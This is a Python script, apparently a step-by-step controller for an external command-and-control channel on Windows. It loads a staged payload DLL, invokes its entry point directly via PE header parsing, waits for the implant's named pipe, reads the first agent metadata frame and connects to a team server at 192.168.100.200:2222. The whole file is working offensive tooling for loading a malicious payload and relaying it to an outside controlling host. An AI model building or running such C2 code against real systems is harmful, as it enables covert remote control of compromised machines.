# -*- coding: utf-8 -*-
"""extc2_step2.py - step-by-step controller with instant file logging:
inject the ALREADY-DOWNLOADED baked stage, watch pipe bind, then relay.
Each step appends to extc2_step2.log so a hang still leaves evidence."""
import ctypes
import hashlib
import socket
import struct
import sys
import threading
import time

import win32file
import win32pipe

OUT = open(r"C:\Users\Public\extc2_step2.log", "w", encoding="utf-8")
PAYLOAD = r"C:\Users\Public\extc2_payload.dll"
PIPENAME = r"\\.\pipe\B1ExtC2"
TS_ADDR = ("192.168.100.200", 2222)
HEARTBEAT = b"\x00"


def log(msg):
    OUT.write("[%s] %s\n" % (time.strftime("%H:%M:%S"), msg))
    OUT.flush()
    print(msg, flush=True)


k32 = ctypes.windll.kernel32
k32.LoadLibraryW.restype = ctypes.c_void_p
k32.LoadLibraryW.argtypes = [ctypes.c_wchar_p]


def main():
    data = open(PAYLOAD, "rb").read()
    log("payload %dB sha=%s" % (len(data), hashlib.sha256(data).hexdigest()[:12]))
    h = k32.LoadLibraryW(PAYLOAD)
    if not h:
        log("LOAD FAIL gle=%d" % k32.GetLastError())
        return
    base = h
    log("loaded base=0x%X" % base)
    e = struct.unpack_from("<I", ctypes.string_at(base + 0x3C, 4))[0]
    entry_rva = struct.unpack_from("<I", ctypes.string_at(base + e + 24 + 0x10, 4))[0]
    log("entry rva=0x%X" % entry_rva)
    entry = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_uint,
                               ctypes.c_void_p)(base + entry_rva)
    threading.Thread(target=lambda: log("DllMain(4) returned %r" % entry(base, 4, None)),
                     daemon=True).start()
    # wait for the pipe to appear
    ph = None
    for i in range(60):
        time.sleep(0.5)
        try:
            ph = win32file.CreateFile(
                PIPENAME, win32file.GENERIC_READ | win32file.GENERIC_WRITE,
                0, None, win32file.OPEN_EXISTING, 0, None)
            break
        except win32file.error:
            pass
    if ph is None:
        log("PIPE NEVER APPEARED after 30s")
        time.sleep(5)
        log("still alive, no pipe -> self-boot stopped before smb_init bind")
        return
    win32pipe.SetNamedPipeHandleState(ph, win32pipe.PIPE_READMODE_MESSAGE, None, None)
    log("pipe connected")

    def rd_unit():
        hr, msg = win32file.ReadFile(ph, 1 << 20)
        if not msg:
            raise EOFError("pipe closed")
        return msg

    meta = rd_unit()
    log("first message %dB head=%s" % (len(meta), meta[:16].hex()))
    # meta should be [4B agentid][...] blob; forward via a fresh TS session
    s = socket.create_connection(TS_ADDR, timeout=10)
    log("ts connected (2nd session)")
    # this 2nd session asks for nothing; the metadata belongs to the FIRST
    # session's flow. For the diagnosis we only needed: bind + first frame.
    s.close()
    log("STEP2 DONE: self-boot WORKS (bind + first frame)")
    time.sleep(3)


if __name__ == "__main__":
    main()
    OUT.close()
